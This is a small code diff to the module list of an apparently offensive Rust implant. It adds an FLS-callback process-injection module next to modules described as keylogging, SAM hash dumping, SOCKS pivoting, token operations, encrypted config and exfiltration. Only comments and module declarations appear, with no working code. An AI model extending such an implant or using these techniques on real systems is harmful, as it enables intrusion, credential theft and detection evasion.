@@ -25,8 +25,8 @@
 //! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
 //! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
 //! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
-//! - [`inject`] / [`tp`] / [`kits`] — process injection (incl. thread-pool
-//!   party) + CS-style kit seams.
+//! - [`inject`] / [`tp`] / [`fls`] / [`kits`] — process injection (incl.
+//!   thread-pool party and FLS callback) + CS-style kit seams.
 //! - [`env_keying`] — environment-keyed config encryption layers.
 //! - [`task_guard`] — crash-guarded task execution (setjmp-style snapshot).
 //! - [`trex`] — target-environment assessment + cleanup/delivery/melt/exfil.
@@ -46,6 +46,10 @@ pub mod bof_isolated;
 pub mod config_placeholder;
 #[cfg(target_os = "windows")]
 pub mod env_keying;
+// fls additionally carries a file-level `#![cfg(target_os = "windows")]`;
+// the outer gate here mirrors the tp.rs declaration pattern.
+#[cfg(target_os = "windows")]
+pub mod fls;
 #[cfg(target_os = "windows")]
 pub mod fs;
 #[cfg(target_os = "windows")]
